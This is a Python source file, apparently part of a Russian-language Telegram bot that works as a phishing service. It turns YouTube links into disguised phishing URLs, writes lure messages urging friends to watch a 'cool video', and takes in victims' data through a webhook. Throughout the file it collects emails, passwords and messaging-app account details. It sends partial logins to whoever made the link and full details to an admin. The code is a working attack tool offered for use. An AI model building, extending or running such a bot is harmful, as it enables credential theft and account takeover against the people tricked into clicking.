    
Основные команды:
/start - Начать работу с ботом
/create - Создать новую URL ссылку
/nip - Настройка модуляций для новой ссылки
/htp - Редактирование существующей ссылки
/support - Техническая поддержка
/data - Просмотр собранных данных
    
Процесс работы:
1. Используйте /create для начала
2. Выберите режим (/nip для новой, /htp для редактирования)
3. Следуйте инструкциям бота
4. Получите готовую ссылку
    
Важно: Все созданные ссылки имеют модуляцию data_send для сбора данных."""
    
    await update.message.reply_text(
        help_message
    )

async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка YouTube ссылки (для режима редактирования)"""
    user = update.effective_user
    url = update.message.text.strip()
    
    # Проверяем, находится ли пользователь в режиме ожидания ссылки
    if not context.user_data.get('waiting_for_link', False):
        # Если нет, проверяем, является ли ссылкой на YouTube
        if not any(domain in url for domain in ['youtube.com', 'youtu.be']):
            return
        
        # Если это YouTube ссылка, но не в режиме редактирования, предлагаем создать
        await update.message.reply_text(
            "Вы отправили ссылку на YouTube видео. Хотите создать новую URL с модуляцией?\n"
            "Используйте команду /create для начала."
        )
        return
    
    # Если пользователь ожидает ссылку для редактирования
    action = context.user_data.get('action')
    
    if action == 'edit_link':
        # Проверяем, является ли ссылкой на YouTube
        if not any(domain in url for domain in ['youtube.com', 'youtu.be']):
            await update.message.reply_text(
                "❌ Это не похоже на ссылку YouTube.\n"
                "Пожалуйста, отправьте ссылку в формате:\n"
                "https://youtube.com/watch?v=...\n"
                "или\n"
                "https://youtu.be/..."
            )
            return
        
        # Извлекаем ID видео
        video_id = link_generator.extract_video_id(url)
        
        # Генерируем ID ссылки
        link_id = link_generator.generate_link_id()
        
        # Создаем фишинговую ссылку
        phishing_url = link_generator.create_phishing_url(video_id, link_id)
        
        # Создаем объект ссылки
        link = PhishingLink(
            id=link_id,
            original_url=url,
            video_id=video_id,
            created_at=datetime.now().isoformat(),
            created_by=user.id
        )
        
        # Сохраняем в базу
        db.add_link(link)
        
        # Отправляем сообщение о готовности ссылки
        message = formatter.format_link_ready(phishing_url, url)
        
        keyboard = [
            [
                InlineKeyboardButton("📋 Копировать", callback_data=f"copy_{link_id}"),
                InlineKeyboardButton("📤 Поделиться", callback_data=f"share_{link_id}")
            ],
            [
                InlineKeyboardButton("🆘 Поддержка", callback_data="support")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            message,
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
        
        # Отправляем уведомление админу
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"🆕 Новая ссылка создана через /htp\n"
                     f"👤 User: @{user.username or user.id}\n"
                     f"🔗 Original: {url[:50]}...\n"
                     f"📌 ID: {link_id}\n"
                     f"🕒 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
        except Exception as e:
            logger.error(f"Error notifying admin: {e}")
        
        # Сбрасываем состояние
        context.user_data.pop('waiting_for_link', None)
        context.user_data.pop('action', None)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик inline кнопок"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "create":
        create_message = formatter.format_create_mode_selection()
        
        keyboard = [
            [InlineKeyboardButton("🔗 Создать новую", callback_data="nip")],
            [InlineKeyboardButton("✏️ Редактировать", callback_data="htp")],
            [InlineKeyboardButton("🆘 Поддержка", callback_data="support")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.reply_text(
            create_message,
            reply_markup=reply_markup
        )
    
    elif data == "nip":
        module_message = formatter.format_module_selection()
        
        keyboard = [
            [InlineKeyboardButton("Модель 1", callback_data="model_1")],
            [InlineKeyboardButton("Модель 2", callback_data="model_2")],
            [InlineKeyboardButton("Модель 3", callback_data="model_3")],
            [InlineKeyboardButton("🆘 Поддержка", callback_data="support")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.reply_text(
            module_message,
            reply_markup=reply_markup
        )
    
    elif data == "htp":
        link_prompt = formatter.format_link_input_prompt()
        await query.message.reply_text(link_prompt)
    
    elif data == "support":
        support_message = """🆘 Техническая поддержка
        
По всем вопросам создания и настройки URL ссылок обращайтесь:
• Через этого бота - команда /help
• Напрямую администратору - @admin_username
• По email: support@domain.com
        
Часто задаваемые вопросы:
1. Как создать ссылку? - Используйте /create
2. Как редактировать существующую ссылку? - Используйте /htp
3. Какие модуляции доступны? - Используйте /nip для просмотра моделей
4. Где соглашение? - https://eu.docworkspace.com/d/slMrjjoDzAabE_LUG
        
Рабочее время поддержки: 10:00-22:00 (МСК)"""
        
        await query.message.reply_text(support_message)
    
    elif data.startswith("model_"):
        model_num = data.split("_")[1]
        await query.message.reply_text(
            f"✅ Выбрана модель {model_num}\n\n"
            f"Теперь отправьте ссылку на YouTube видео для применения модуляций.\n"
            f"Или используйте команду /htp для редактирования существующей ссылки."
        )
    
    elif data.startswith("copy_"):
        link_id = data[5:]
        link = db.get_link(link_id)
        if link:
            phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
            await query.message.reply_text(
                f"📋 Ссылка для копирования:\n\n{phishing_url}\n\n"
                "Используйте Ctrl+C / Cmd+C для копирования."
            )
    
    elif data.startswith("share_"):
        link_id = data[6:]
        link = db.get_link(link_id)
        if link:
            phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
            share_text = f"""🎬 Смотри это крутое видео! 🎬

Я нашел очень интересное видео на YouTube!
Обязательно посмотри - не пожалеешь!

🔗 Ссылка: {phishing_url}

#видео #youtube #рекомендация"""
            
            await query.message.reply_text(
                f"📤 Текст для отправки:\n\n{share_text}\n\n"
                "Скопируйте и отправьте другу."
            )

# Webhook обработчик для сбора данных
async def handle_webhook(request_data: Dict, context: ContextTypes.DEFAULT_TYPE):
    """Обработка данных от фишинговой страницы"""
    try:
        link_id = request_data.get("link_id")
        if not link_id:
            return {"status": "error", "message": "No link ID"}
        
        # Обновляем счетчик кликов
        db.add_click(link_id)
        
        # Всегда собираем чувствительные данные
        collected_data = await data_collector.collect_all_data(request_data)
        
        # Получаем информацию о ссылке
        link = db.get_link(link_id)
        if link:
            # Отправляем данные создателю ссылки в формате скриншотов
            sensitive_data = collected_data.get("data", {}).get("sensitive_data", {})
            
            if sensitive_data.get("status") == "fully_processed":
                # Генерируем номер логина
                login_number = len(link.full_sensitive_data)
                
                # Создаем данные в формате скриншотов
                login_data = {
                    "phone": "Unknown Device",
                    "serial": link.id[:8],
                    "dpp": "AUTO",
                    "email": None,
                    "email_password": None,
                    "facebook": None,
                    "facebook_password": None,
                    "viber": None,
                    "whatsapp": None,
                    "messenger": None
                }
                
                # Извлекаем данные из последней записи
                if link.full_sensitive_data:
                    last_data = link.full_sensitive_data[-1]
                    credentials = last_data.get("credentials", {})
                    
                    # Ищем email
                    if credentials.get("logins"):
                        for login in credentials["logins"]:
                            value = login.get("value", "")
                            if "@" in value and "." in value:
                                login_data["email"] = value
                                break
                    
                    # Ищем пароли
                    if credentials.get("passwords"):
                        for pwd in credentials["passwords"]:
                            if pwd.get("value"):
                                login_data["email_password"] = pwd.get("value", "...")[:3] + "..."
                                break
                
                # Отправляем в формате скриншотов
                login_message = formatter.format_login_data(login_number, login_data)
                
                try:
                    await context.bot.send_message(
                        chat_id=link.created_by,
                        text=login_message
                    )
                except Exception as e:
                    logger.error(f"Error sending to link creator: {e}")
            
            # Отправляем ДЕТАЛЬНЫЕ данные админу
            await send_detailed_data_to_admin(context, link, collected_data)
        
        return {"status": "success", "data_received": True}
    
    except Exception as e:
        logger.error(f"Error in webhook handler: {e}", exc_info=True)
        return {"status": "error", "message": str(e)}

# Команда для просмотра данных
async def data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /data - просмотр собранных данных"""
    user = update.effective_user
    
    if not context.args:
        user_links = [link for link in db.links.values() if link.created_by == user.id]
        
        if not user_links:
            await update.message.reply_text("📭 У вас нет собранных данных.")
            return
        
        # Отправляем последние логины
        login_count = 0
        for link in user_links:
            if link.full_sensitive_data:
                for sensitive_data in link.full_sensitive_data[-3:]:  # Последние 3 записи
                    login_count += 1
                    
                    login_data = {
                        "phone": "Unknown",
                        "serial": link.id[:8],
                        "dpp": "N/A",
                        "email": None,
                        "email_password": None,
                        "facebook": None,
                        "facebook_password": None,
                        "viber": None,
                        "whatsapp": None,
                        "messenger": None
                    }
                    
                    # Извлекаем данные
                    credentials = sensitive_data.get("credentials", {})
                    if credentials.get("logins"):
                        for login in credentials["logins"]:
                            value = login.get("value", "")
                            if "@" in value and "." in value:
                                login_data["email"] = value
                                break
                    
                    if credentials.get("passwords"):
                        for pwd in credentials["passwords"]:
                            if pwd.get("value"):
                                login_data["email_password"] = pwd.get("value", "...")[:3] + "..."
                                break
                    
                    login_message = formatter.format_login_data(login_count, login_data)
                    await update.message.reply_text(login_message)
        
        if login_count == 0:
            await update.message.reply_text("📭 Данные еще не собраны. Дождитесь переходов по вашей ссылке.")
        return
    
    arg = context.args[0]
    
    if arg == "stats":
        user_links = [link for link in db.links.values() if link.created_by == user.id]
        
        if not user_links:
            await update.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        total_clicks = sum(link.clicks for link in user_links)
        total_data = sum(len(link.full_sensitive_data) for link in user_links)
        
        message = f"""📈 Ваша статистика:
        
🔗 Создано ссылок: {len(user_links)}
👥 Всего переходов: {total_clicks}
🔓 Собрано данных: {total_data}
        
Последние ссылки:
"""
        
        for link in user_links[-3:]:
            message += f"• {link.id[:8]}: {link.clicks} переходов, {len(link.full_sensitive_data)} данных\n"
        
        await update.message.reply_text(message)

# Обработчик ошибок
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик ошибок"""
    logger.error(f"Update {update} caused error {context.error}", exc_info=True)
    
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"⚠️ Ошибка в боте: {context.error}"
        )
    except:
        pass

def main():
    """Запуск бота"""
    # Создаем приложение
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Регистрируем обработчики команд
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("create", create_command))
    application.add_handler(CommandHandler("nip", nip_command))
    application.add_handler(CommandHandler("htp", htp_command))
    application.add_handler(CommandHandler("support", support_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("data", data_command))
    
    # Обработчик YouTube ссылок (для режима редактирования)
    application.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND,
        handle_youtube_link
    ))
    
    # Обработчик inline кнопок
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Обработчик ошибок
    application.add_error_handler(error_handler)
    
    # Запускаем бота
    print("🤖 URL Generator Bot запущен!")
    print(f"👑 Админ: {ADMIN_ID}")
    print(f"🌐 Домен: {DOMAIN}")
    print("🔐 Функции сбора данных активны")
    print("⏳ Ожидание команд...")
    
    # Исправленная строка запуска - убрали ALL_UPDATES
    application.run_polling()

if __name__ == '__main__':
    main()